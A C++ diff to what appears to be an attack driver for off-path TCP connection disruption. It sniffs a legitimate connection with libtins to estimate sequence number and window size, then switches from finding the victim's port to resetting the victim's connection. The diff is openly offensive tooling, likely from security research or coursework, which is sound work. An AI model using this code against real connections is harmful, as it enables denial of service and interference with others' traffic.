@@ -25,7 +25,7 @@ void printHeader(const std::string msg) {
     cout << endl;
 }
 
-pair<ConnectionID, uint32_t> waitAndGetLegitConnectionInfo(
+tuple<ConnectionID, uint32_t, uint32_t> waitAndGetLegitConnectionInfo(
         const string& serverIP, int serverPort) {
     Tins::Sniffer sniffer(kNetworkInterface);
     sniffer.set_filter(
@@ -33,8 +33,16 @@ pair<ConnectionID, uint32_t> waitAndGetLegitConnectionInfo(
     sniffer.set_pcap_sniffing_method(pcap_dispatch);
     sniffer.set_timeout(kInitPacketWaitSec);
     int packetCount = kInitPacketCount;
+    uint32_t estimatedWindowSize = 26703;
+    uint32_t ws = 1;
     while (packetCount > 0) {
-        sniffer.next_packet();
+        auto pdu = sniffer.next_packet().pdu();
+        const Tins::TCP& tcp = pdu->rfind_pdu<Tins::TCP>();
+        if (tcp.has_flags(tcp.SYN)) {
+            ws = 1 << tcp.winscale();
+        } else {
+            estimatedWindowSize = min(estimatedWindowSize, tcp.window() * ws);
+        }
         packetCount--;
     }
 
@@ -50,8 +58,9 @@ pair<ConnectionID, uint32_t> waitAndGetLegitConnectionInfo(
         const Tins::TCP &tcp = pdu->rfind_pdu<Tins::TCP>();
         connection = ConnectionID(ip.src_addr(), tcp.sport(), ip.dst_addr(), tcp.dport()); 
         lastSeq = max(lastSeq, tcp.seq());
+        estimatedWindowSize = min(estimatedWindowSize, tcp.window() * ws);
     }
-    return make_pair(connection, lastSeq);
+    return make_tuple(connection, lastSeq, estimatedWindowSize);
 }
 
 void testClock(const ConnectionID& legitConn, int legitLastSeq, milliseconds delayMs) {
@@ -78,20 +87,33 @@ void testClock(const ConnectionID& legitConn, int legitLastSeq, milliseconds del
 int main() {
     printHeader("WAITING FOR THE LEGIT CONNECTION...");
     auto legitInfo = waitAndGetLegitConnectionInfo(kServerIP, kServerPort);
-    auto legitConn = legitInfo.first;
-    auto legitLastSeq = legitInfo.second;
-    cout << "Got legit connection info: " << legitConn.toString() << " " << legitLastSeq << endl;
+    auto legitConn = get<0>(legitInfo);
+    auto legitLastSeq = get<1>(legitInfo);
+    auto estimatedWS = get<2>(legitInfo);
+    cout << "Got legit connection info: " 
+        << legitConn.toString() << " " 
+        << legitLastSeq << " " 
+        << estimatedWS << endl;
 
     Attacker attacker(legitConn, legitLastSeq, kVictimIP);
+    attacker.setEstimatedWindowSz(estimatedWS);
 
     printHeader("SYNCHRONIZING CLOCK...");
     auto syncDelayMs = attacker.synchronizeClock();
     cout << "Synchronization delay: " << syncDelayMs.count() << "ms" << endl;
 
-    printHeader("FINDING VICTIM'S PORT...");
+    // printHeader("FINDING VICTIM'S PORT...");
+    // try {
+    //     auto victimPort = attacker.findPort(32000, 65535);
+    //     cout << "Victim's port: " << victimPort << endl;
+    // } catch (char const* err) {
+    //     cout << "Error: " << err << endl;
+    //     return 1;
+    // }
+
+    printHeader("RESETING VICTIM'S CONNECTION...");
     try {
-        auto victimPort = attacker.find_port(32000, 65535);
-        cout << "Victim's port: " << victimPort << endl;
+        attacker.resetConnection();
     } catch (char const* err) {
         cout << "Error: " << err << endl;
         return 1;
